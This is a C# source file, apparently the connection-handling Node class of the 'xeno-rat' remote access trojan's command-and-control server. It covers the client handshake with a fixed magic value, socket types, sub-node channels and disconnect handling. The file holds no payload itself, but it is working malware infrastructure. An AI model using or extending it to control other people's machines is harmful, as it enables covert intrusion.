using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_server
{
    public partial class Node
    {

        /// <summary>
        /// Compares two arrays of bytes and returns an integer that indicates their relative position in lexicographical order.
        /// </summary>
        /// <param name="b1">The first array of bytes to be compared.</param>
        /// <param name="b2">The second array of bytes to be compared.</param>
        /// <param name="count">The number of bytes to compare.</param>
        /// <returns>
        /// An integer that indicates the relationship between the two arrays:
        /// - Less than 0 if the first differing byte in <paramref name="b1"/> is less than the corresponding byte in <paramref name="b2"/>.
        /// - 0 if the contents of both arrays are equal.
        /// - Greater than 0 if the first differing byte in <paramref name="b1"/> is greater than the corresponding byte in <paramref name="b2"/>.
        /// </returns>
        /// <exception cref="ArgumentException">Thrown when the length of either array is less than <paramref name="count"/>.</exception>
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);

        private SemaphoreSlim OneRecieveAtATime = new SemaphoreSlim(1);
        public bool isDisposed = false;
        private Action<Node> OnDisconnect;
        private List<Action<Node>> TempOnDisconnects = new List<Action<Node>>();
        public List<Node> subNodes;
        private Dictionary<int, Node> subNodeWait;
        public SocketHandler sock;
        public Node Parent;
        public int ID = -1;
        public int SubNodeIdCount = 0;
        public int SockType = 0;//0 = main, 1 = heartbeat, 2 = anything else
        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
        {
            sock = _sock;
            subNodes = new List<Node>();//make it only initiate if non-plugin/heartbeat
            subNodeWait = new Dictionary<int, Node>();
            OnDisconnect = _OnDisconnect;
        }

        /// <summary>
        /// Generates a byte array of the specified size filled with random values.
        /// </summary>
        /// <param name="size">The size of the byte array to be generated.</param>
        /// <returns>A byte array of size <paramref name="size"/> filled with random values.</returns>
        /// <remarks>
        /// This method creates a new instance of the Random class to generate random values and fills the byte array with these values using the NextBytes method.
        /// </remarks>
        private byte[] GetByteArray(int size)
        {
            Random rnd = new Random();
            byte[] b = new byte[size];
            rnd.NextBytes(b);
            return b;
        }

        /// <summary>
        /// Sets the ID of the object.
        /// </summary>
        /// <param name="id">The ID to be set.</param>
        public void SetID(int id)
        {
            ID = id;
        }

        /// <summary>
        /// Compares two byte arrays and returns true if they are equal; otherwise, false.
        /// </summary>
        /// <param name="b1">The first byte array to be compared.</param>
        /// <param name="b2">The second byte array to be compared.</param>
        /// <returns>True if the byte arrays are equal; otherwise, false.</returns>
        /// <remarks>
        /// This method compares the lengths of the input byte arrays <paramref name="b1"/> and <paramref name="b2"/>.
        /// If the lengths are not equal, the method returns false.
        /// Otherwise, it uses the memcmp function to compare the contents of the byte arrays.
        /// The memcmp function returns 0 if the byte arrays are equal, and a non-zero value if they are not equal.
        /// </remarks>
        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {

            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }

        /// <summary>
        /// Asynchronously receives a byte array from the socket, converts it to an integer representing the socket type, and returns the result.
        /// </summary>
        /// <returns>
        /// The integer representing the socket type received from the socket.
        /// </returns>
        /// <exception cref="Exception">
        /// Thrown when the received byte array is null, indicating a disconnection, in which case the method also calls the Disconnect method and returns -1.
        /// </exception>
        private async Task<int> GetSocketType()
        {
            byte[] type = await sock.ReceiveAsync();
            if (type == null) 
            {
                Disconnect();
                return -1;
            }
            int IntType = sock.BytesToInt(type);
            return IntType;
        }

        /// <summary>
        /// Sets the isDisposed flag to true and disconnects the socket, disposes resources, and triggers the OnDisconnect event.
        /// </summary>
        /// <remarks>
        /// This method sets the <paramref name="isDisposed"/> flag to true and disconnects the socket if it is not null using asynchronous operation.
        /// It disposes the socket and the OneRecieveAtATime resource.
        /// If <paramref name="SockType"/> is 0, it iterates through the subNodes list and calls the Disconnect method for each node with SockType not equal to 1.
        /// Finally, it triggers the OnDisconnect event and executes any temporary disconnect actions stored in TempOnDisconnects.
        /// </remarks>
        public async void Disconnect()
        {
            isDisposed = true;
            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock.sock?.Close(0);
            }
            sock.sock?.Dispose();
            OneRecieveAtATime.Dispose();
            if (SockType == 0)
            {
                foreach (Node i in subNodes.ToList())
                {
                    try
                    {
                        if (i.SockType != 1)
                        {
                            i?.Disconnect();
                        }
                    }
                    catch { }
                }
            }
            if (OnDisconnect != null)
            {
                OnDisconnect(this);
            }
            List<Action<Node>> copy = TempOnDisconnects.ToList();
            TempOnDisconnects.Clear();
            foreach (Action<Node> tempdisconnect in copy) 
            {
                tempdisconnect(this);
            }
            copy.Clear();
            subNodes.Remove(this);
        }

        /// <summary>
        /// Sets the receive timeout for the socket.
        /// </summary>
        /// <param name="ms">The receive timeout value in milliseconds.</param>
        /// <remarks>
        /// This method sets the receive timeout for the underlying socket to the specified value in milliseconds.
        /// A receive timeout value of 0 indicates an infinite timeout.
        /// </remarks>
        public void SetRecvTimeout(int ms)
        {
            sock.SetRecvTimeout(ms);
        }

        /// <summary>
        /// Resets the receive timeout for the socket.
        /// </summary>
        /// <remarks>
        /// This method resets the receive timeout for the underlying socket to the default value.
        /// </remarks>
        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }

        /// <summary>
        /// Checks if the socket is connected and returns a boolean value indicating the connection status.
        /// </summary>
        /// <returns>True if the socket is connected; otherwise, false.</returns>
        /// <remarks>
        /// This method checks the connection status of the socket and returns a boolean value indicating whether the socket is connected or not.
        /// If an exception occurs during the check, the method returns false.
        /// </remarks>
        public bool Connected()
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Asynchronously receives data from the socket and returns the received data as a byte array.
        /// </summary>
        /// <returns>The received data as a byte array, or null if the socket is disposed or if the received data is null.</returns>
        /// <exception cref="ObjectDisposedException">Thrown if the socket is disposed.</exception>
        public async Task<byte[]> ReceiveAsync() 
        {
            if (isDisposed) 
            {
                return null;
            }
            await OneRecieveAtATime.WaitAsync();
            try
            {
                byte[] data = await sock.ReceiveAsync();
                if (data == null)
                {
                    Disconnect();
                    return null;
                }
                return data;
            }
            finally
            {
                OneRecieveAtATime.Release();
            }
        }

        /// <summary>
        /// Sends the provided data asynchronously and returns a boolean indicating the success of the operation.
        /// </summary>
        /// <param name="data">The byte array to be sent.</param>
        /// <returns>True if the data was sent successfully; otherwise, false.</returns>
        /// <exception cref="Exception">Thrown when an error occurs during the send operation.</exception>
        /// <remarks>
        /// This method sends the provided byte array <paramref name="data"/> asynchronously using the underlying socket.
        /// If the send operation fails, the method disconnects from the socket and returns false.
        /// </remarks>
        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                Disconnect();
                return false;
            }
            return true;
        }

        /// <summary>
        /// Gets the IP address of the remote endpoint.
        /// </summary>
        /// <returns>The IP address of the remote endpoint as a string. If the IP address cannot be retrieved, "N/A" is returned.</returns>
        public string GetIp()
        {
            string ip="N/A";
            try 
            { 
                ip= ((IPEndPoint)sock.sock.RemoteEndPoint).Address.ToString();
            } 
            catch 
            { 
            }
            return ip;
            
        }

        /// <summary>
        /// Creates a sub node asynchronously and returns the created node.
        /// </summary>
        /// <param name="Type">The type of the sub node to be created. Must be 1 or 2.</param>
        /// <exception cref="Exception">Thrown when the <paramref name="Type"/> is less than 1 or greater than 2.</exception>
        /// <returns>The created sub node, or null if creation failed.</returns>
        /// <remarks>
        /// This method asynchronously creates a sub node with the specified <paramref name="Type"/>.
        /// It generates a random ID for the sub node and sends a request to create the sub node.
        /// If the creation is successful, it waits for the sub node to be populated and returns it.
        /// If creation fails or the sub node is not populated within 10 seconds, it returns null.
        /// </remarks>
        public async Task<Node> CreateSubNodeAsync(int Type)//1 or 2 
        {
            if (Type < 1 || Type > 2)
            {
                throw new Exception("ID too high or low. must be a 1 or 2.");
            }
            Random rnd = new Random();
            int retid = rnd.Next(1, 256);
            while (subNodeWait.ContainsKey(retid))
            {
                retid = rnd.Next(1, 256);
            }//improve this to get rid of possible wait time (just need to use bigger numbers)
            subNodeWait[retid] = null;
            byte[] CreateSubReq = new byte[] { 0, (byte)Type, (byte)retid };
            await SendAsync(CreateSubReq);
            byte[] worked = await ReceiveAsync();
            if (worked == null || worked[0] == 0)
            {
                subNodeWait.Remove(retid);
                return null;
            }
            int count = 0;
            while (subNodeWait[retid] == null && Connected() && count < 10)
            {
                await Task.Delay(1000);
                count++;
            }
            Node subNode = subNodeWait[retid];
            subNodeWait.Remove(retid);
            return subNode;
        }

        /// <summary>
        /// Adds a function to the list of actions to be executed when a node is disconnected.
        /// </summary>
        /// <param name="function">The function to be added to the list.</param>
        /// <remarks>
        /// This method adds the specified function to the list of actions to be executed when a node is disconnected.
        /// </remarks>
        public void AddTempOnDisconnect(Action<Node> function) 
        { 
            TempOnDisconnects.Add(function);
        }

        /// <summary>
        /// Removes the specified function from the list of temporary disconnect actions.
        /// </summary>
        /// <param name="function">The function to be removed from the list.</param>
        /// <remarks>
        /// This method removes the specified function from the list of temporary disconnect actions, if it exists.
        /// If the function does not exist in the list, no action is taken.
        /// </remarks>
        public void RemoveTempOnDisconnect(Action<Node> function)
        {
            TempOnDisconnects.Remove(function);
        }

        /// <summary>
        /// Adds a subnode to the list of subnodes.
        /// </summary>
        /// <param name="subnode">The subnode to be added.</param>
        /// <exception cref="ArgumentException">Thrown when the subnode's SockType is not equal to 0.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method adds the specified subnode to the list of subnodes. If the subnode's SockType is not equal to 0, it waits for a response from the subnode and then adds it to the subNodeWait dictionary using the received ID as the key. If no response is received, the subnode is disconnected. If the SockType is equal to 0, the subnode is disconnected without waiting for a response. Finally, the subnode is added to the subNodes list.
        /// </remarks>
        public async Task AddSubNode(Node subnode) 
        {
            if (subnode.SockType != 0)
            {
                byte[] retid = await subnode.ReceiveAsync();
                if (retid == null) 
                {
                    subnode.Disconnect();
                }
                subNodeWait[retid[0]] = subnode;
            }
            else 
            {
                subnode.Disconnect();
            }
            subNodes.Add(subnode);
        }

        /// <summary>
        /// Authenticates the client with the server using a random key exchange and returns a boolean indicating success or failure.
        /// </summary>
        /// <param name="id">The unique identifier of the client.</param>
        /// <returns>True if the authentication is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method initiates the authentication process by exchanging a random key with the server.
        /// If the key exchange is successful, it proceeds to validate the socket type and client ID before completing the authentication.
        /// If any step in the process fails, the method returns false.
        /// </remarks>
        public async Task<bool> AuthenticateAsync(int id)//first call that should ever be made!
        {
            try
            {
                byte[] randomKey = GetByteArray(100);
                byte[] data;
                if (!(await sock.SendAsync(randomKey)))
                {
                    return false;
                }
                sock.SetRecvTimeout(10000);
                data = await sock.ReceiveAsync();
                if (data == null)
                {
                    return false;
                }
                if (ByteArrayCompare(randomKey, data))
                {
                    if (!(await sock.SendAsync(new byte[] { 109, 111, 111, 109, 56, 50, 53 })))
                    {
                        return false;
                    }
                    int type = await GetSocketType();
                    if (type > 2 || type < 0)
                    {
                        return false;
                    }
                    if (type == 0)
                    {
                        byte[] sockId = sock.IntToBytes(id);
                        ID = id;
                        if (!(await sock.SendAsync(sockId)))
                        {
                            return false;
                        }
                    }
                    else
                    {
                        data = await sock.ReceiveAsync();
                        if (data == null)
                        {
                            Disconnect();
                            return false;
                        }
                        int sockId = sock.BytesToInt(data);
                        ID = sockId;
                    }
                    SockType = type;
                    sock.ResetRecvTimeout();
                    return true;
                }
            }
            catch { }
            return false;
        }
    }
}
